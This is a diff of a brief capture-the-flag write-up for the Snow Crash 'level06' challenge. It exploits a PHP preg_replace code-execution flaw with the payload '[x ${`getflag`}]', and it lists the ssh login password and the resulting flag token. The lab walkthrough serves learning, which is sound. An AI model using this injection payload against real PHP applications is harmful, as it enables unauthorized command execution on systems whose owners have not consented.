@@ -1,11 +1,17 @@
-🔻 Analyze
-⬇️ link: https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/
-⬇️ echo "start [x a.[b]@c] end" > /tmp/test
-⬇️ ./level06 /tmp/test
-👉 start a x (b) yc end
++ ---- 🔻 Analyze ----
+|
+|   link: https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/
+|   echo "start [x a.[b]@c] end" > /tmp/test
+|   ./level06 /tmp/test
+|   👉 start a x (b) yc end
+|
 
 
-🔻 Hack
-⬇️ echo "[x \${\`getflag\`}]" > /tmp/hack
-⬇️ ./level06 /tmp/hack
-👉 Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
++ ---- 🔻 Hack -------
+|
+|   ssh level06@$SNOW_CRASH_IP -p 4242
+|   └ viuaaale9huek52boumoomioc
+|   echo "[x \${\`getflag\`}]" > /tmp/hack
+|   ./level06 /tmp/hack
+|   👉 Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+|   
